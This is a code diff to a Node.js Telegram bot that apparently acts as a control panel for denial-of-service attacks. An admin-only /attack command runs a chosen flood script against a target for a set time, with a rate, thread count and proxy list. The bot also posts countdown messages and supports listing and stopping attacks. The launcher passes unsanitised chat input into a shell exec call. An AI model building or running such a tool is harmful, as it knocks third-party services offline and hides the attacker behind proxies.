@@ -63,7 +63,7 @@ bot.onText(/^\/system$/, async (msg) => {
   }
 })
 
-bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/^\/attack(?:\s(.+))?/, (msg, match) => {
   if (msg.from.id.toString() !== adminId) {
     bot.sendMessage(msg.chat.id, 'Access denied')
     return
@@ -87,7 +87,7 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
   const threads = 12
   const proxyfile = './prx.txt'
 
-  if (!target || isNaN(time) || time <= 0) {
+  if (!target || isNaN(time)) {
     bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
     return
   }
@@ -95,27 +95,14 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
   const attackId = Date.now()
   const attackData = {
     id: attackId,
-    method,
     target,
     time,
     rate,
     threads,
     proxyfile,
     status: 'started',
-    messageId: null,
-    endTime: Date.now() + time * 1000
+    messageId: null
   }
-
-  const sentMsg = await bot.sendMessage(msg.chat.id, '```json\n' + JSON.stringify({
-    status: attackData.status,
-    method,
-    target,
-    time,
-    rate,
-    threads,
-    proxyfile
-  }, null, 2) + '\n```', { parse_mode: 'Markdown' })
-  attackData.messageId = sentMsg.message_id
 
   const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
     if (err) {
@@ -126,51 +113,47 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
     bot.sendMessage(msg.chat.id, `Attack ${target} completed successfully`)
   })
 
-  child.on('error', (err) => {
-    bot.sendMessage(msg.chat.id, `Child process error: ${err.message}`)
-    attacks = attacks.filter(a => a.id !== attackId)
-    bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
-  })
+  attackData.pid = child.pid
+  attacks.push(attackData)
 
-  child.on('spawn', () => {
-    attackData.pid = child.pid
-    attacks.push(attackData)
+  bot.sendMessage(msg.chat.id, '```json\n' + JSON.stringify({
+    status: attackData.status,
+    target,
+    time,
+    rate,
+    threads,
+    proxyfile
+  }, null, 2) + '\n```', { parse_mode: 'Markdown' }).then(sentMsg => {
+    attackData.messageId = sentMsg.message_id
 
-    const interval = setInterval(() => {
-      const now = Date.now()
-      const remainingTime = Math.max(0, Math.round((attackData.endTime - now) / 1000))
+    setTimeout(() => {
       attackData.status = 'running'
-
-      if (remainingTime <= 0 || !attacks.find(a => a.id === attackId)) {
-        clearInterval(interval)
-        bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
-        attacks = attacks.filter(a => a.id !== attackId)
-        return
-      }
-
-      bot.editMessageText('```json\n' + JSON.stringify({
-        status: attackData.status,
-        method,
-        target,
-        time: remainingTime,
-        rate,
-        threads,
-        proxyfile
-      }, null, 2) + '\n```', {
-        chat_id: msg.chat.id,
-        message_id: attackData.messageId,
-        parse_mode: 'Markdown'
-      }).catch((err) => {
-        bot.sendMessage(msg.chat.id, `Error updating attack status: ${err.message}`)
-        clearInterval(interval)
-        attacks = attacks.filter(a => a.id !== attackId)
-      })
+      let remainingTime = time
+      const interval = setInterval(() => {
+        remainingTime -= 5
+        if (remainingTime <= 0) {
+          clearInterval(interval)
+          bot.deleteMessage(msg.chat.id, attackData.messageId)
+          attacks = attacks.filter(a => a.id !== attackId)
+          return
+        }
+        bot.editMessageText('```json\n' + JSON.stringify({
+          status: attackData.status,
+          target,
+          time: remainingTime,
+          rate,
+          threads,
+          proxyfile
+        }, null, 2) + '\n```', {
+          chat_id: msg.chat.id,
+          message_id: attackData.messageId,
+          parse_mode: 'Markdown'
+        }).catch(() => {
+          clearInterval(interval)
+          attacks = attacks.filter(a => a.id !== attackId)
+        })
+      }, 5000)
     }, 5000)
-  })
-
-  child.on('exit', () => {
-    attacks = attacks.filter(a => a.id !== attackId)
-    bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
   })
 
   bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`)
@@ -185,7 +168,7 @@ bot.onText(/^\/list$/, (msg) => {
     bot.sendMessage(msg.chat.id, 'No active attacks')
     return
   }
-  const attackList = attacks.map(a => `ID: ${a.id}, Method: ${a.method}, Target: ${a.target}, Time: ${Math.round((a.endTime - Date.now()) / 1000)}s`).join('\n')
+  const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s`).join('\n')
   bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`)
 })
 
@@ -211,7 +194,9 @@ bot.onText(/^\/stop(?:\s(.+))?/, (msg, match) => {
   attacks = attacks.filter(a => a.id !== attackId)
   try {
     process.kill(attack.pid)
-    bot.deleteMessage(msg.chat.id, attack.messageId).catch(() => {})
+    if (attack.messageId) {
+      bot.deleteMessage(msg.chat.id, attack.messageId)
+    }
     bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`)
   } catch (e) {
     bot.sendMessage(msg.chat.id, `Error stopping attack: ${e.message}`)
